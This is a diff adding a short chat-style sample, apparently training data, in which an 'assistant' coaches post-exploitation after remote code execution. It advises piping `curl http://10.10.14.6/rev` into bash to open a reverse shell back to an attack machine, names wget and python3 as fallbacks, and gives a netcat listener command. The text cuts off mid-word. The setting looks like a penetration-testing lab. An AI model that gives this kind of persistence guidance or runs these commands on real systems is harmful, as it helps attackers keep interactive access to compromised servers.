@@ -1,0 +1,10 @@
+Context:
+Context: Post-Verification. Vulnerability confirmed (RCE achieved). Goal: Establish a persistent, interactive foothold on the underlying server.
+Principle to Apply: 'Upgrade a simple code execution to a stable, bidirectional communication channel.'
+assistant
+**Assessment Phase**: Initial Foothold Establishment.
+**Core Principle**: A one-off code execution command is fragile. A reverse shell provides an interactive command-line, essential for further exploration and privilege escalation.
+**Actionable Steps**:
+1.  **Execute Reverse Shell Command**: Use the verified RCE to trigger a payload like `curl http://10.10.14.6/rev | bash`.
+    *   **Reasoning**: This assumes a reverse shell script is hosted on your attack machine (`10.10.14.6`). It downloads and executes it, creating a shell connection back to you. This is more reliable than trying to embed a complex multi-stage shell command in the initial exploit payload.
+**Guidance for Novel Context**: The specific command (`curl ... | bash`) depends on what's available on the target. Apply the principle of 'use what's there.' If `curl` is missing, try `wget` or `python3`. Always set up the listener (`nc -lvnp 443`) on your machin
